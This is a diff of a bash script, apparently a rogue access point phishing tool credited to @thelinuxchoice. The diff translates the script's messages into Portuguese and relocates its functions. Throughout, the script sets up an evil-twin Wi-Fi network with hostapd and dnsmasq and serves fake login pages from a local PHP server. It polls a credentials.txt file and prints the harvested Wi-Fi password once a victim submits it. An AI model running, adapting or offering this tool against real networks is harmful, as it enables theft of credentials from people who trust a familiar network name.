@@ -1,11 +1,11 @@
-trap 'printf "\n"; stop; exit 1' 2
+#!/bin/bash
 
 list_folders() {
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Available folders:\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
   counter=1
-  for folder in $(ls -d */) ; do
+  for folder in $(ls -d .sites/*/); do
     if [[ -f "$folder/login.php" ]]; then
-      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Fake Login Page)\n" $counter $folder
+      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter $folder
     else
       printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
     fi
@@ -14,9 +14,9 @@ list_folders() {
 }
 
 dependencies() {
-  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-  command -v dnsmasq > /dev/null 2>&1 || { echo >&2 "I require dnsmasq but it's not installed. Install it. Aborting."; exit 1; }
-  command -v hostapd > /dev/null 2>&1 || { echo >&2 "I require hostapd but it's not installed. Install it. Aborting."; exit 1; }
+  command -v php > /dev/null 2>&1 || { echo >&2 "O php é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
+  command -v dnsmasq > /dev/null 2>&1 || { echo >&2 "O dnsmasq é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
+  command -v hostapd > /dev/null 2>&1 || { echo >&2 "O hostapd é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
 }
 
 banner()  {
@@ -29,35 +29,13 @@ banner()  {
   printf "\e[1;77m888     888  888 888  88b Y8b.           \e[0m\e[1;92md8888888888 888        \e[0m\n"
   printf "\e[1;77m888      Y888888 888  888   Y8888       \e[0m\e[1;92md88P     888 888\e[0m\e[1;77m v1.0\e[0m\n"
   printf "\n"
-  printf "\e[1;31m                   .-  _           _  -. \n"
+  printf "\e[1;93m                   .-  _           _  -. \n"
   printf "                  /   /             \   \ \n"
   printf "                 (   (  (\` (-o-) \`)  )   ) \n"
   printf "                  \   \_ \`  -+-  \` _/   / \n"
   printf "                   \`-       -+-       -\` \n"
   printf "                            -+- \e[0m\e[1;77mCoded by: @thelinuxchoice\e[0m\n"
   printf "\n"
-}
-
-catch_cred() {
-  IFS=$'\n'
-  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-  printf " SSID: %s\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
-  stop
-  exit 1
-}
-
-getcredentials() {
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
-  while [ true ]; do
-    if [[ -e "credentials.txt" ]]; then
-      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
-      catch_cred
-    fi
-    sleep 1
-  done 
 }
 
 createpage() {
@@ -97,17 +75,17 @@ createpage() {
 }
 
 server() {
-  printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor PHP...\n"
   php -S 192.168.1.1:80 > /dev/null 2>&1 & 
   sleep 2
   getcredentials
 }
 
 stop() {
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" 
   killall dnsmasq hostapd > /dev/null 2>&1
   sleep 4
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Restarting Network Service..\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o Serviço de Rede..\n" 
   service networking restart
   sleep 5
 }
@@ -125,18 +103,18 @@ start() {
     let counter++
   done
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface a ser usada:\e[0m ' use_interface
   choosed_interface=$(sed ''$use_interface'q;d' iface)
   IFS=$'\n'
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Login page (Default: login.php): \e[0m' login_page
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Página de login (Padrão: login.php):\e[0m ' login_page
   login_page="${login_page:-login.php}"
   list_folders
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Fake page number to use:\e[0m ' fake_page_number
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Número da página falsa a ser usada:\e[0m ' fake_page_number
   fake_page=$(sed ''$fake_page_number'q;d' folders)
   createpage
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\e[0m\n" 
   sleep 2
   killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
   sleep 5
@@ -148,13 +126,13 @@ start() {
   printf "macaddr_acl=0\n" >> hostapd.conf
   printf "auth_algs=1\n" >> hostapd.conf
   printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface 
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s desativada\n" $choosed_interface 
   ifconfig $choosed_interface down
   sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\e[0m\n" $choosed_interface
   iwconfig $choosed_interface mode monitor
   sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface 
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s ativada\e[0m\n" $choosed_interface 
   ifconfig wlan0 up
   sleep 5
   hostapd hostapd.conf > /dev/null 2>&1 &
@@ -174,14 +152,39 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface
   sleep 1
   dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
   sleep 5
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para Parar: ./fakeap.sh --stop\e[0m\n"
   server
 }
 
-case "$1" in --stop) stop ;; 
+catch_cred() {
+  IFS=$'\n'
+  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
+  printf " SSID: %s\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
+  stop
+  exit 1
+}
+
+getcredentials() {
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais ...\e[0m\n"
+  while [ true ]; do
+    if [[ -e "credentials.txt" ]]; then
+      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais Encontradas!\n"
+      catch_cred
+    fi
+    sleep 1
+  done 
+}
+
+case "$1" in
+--stop)
+  stop
+  ;; 
 *)
- banner 
-dependencies
- start
- ;; 
+  banner 
+  dependencies
+  start
+  ;; 
 esac
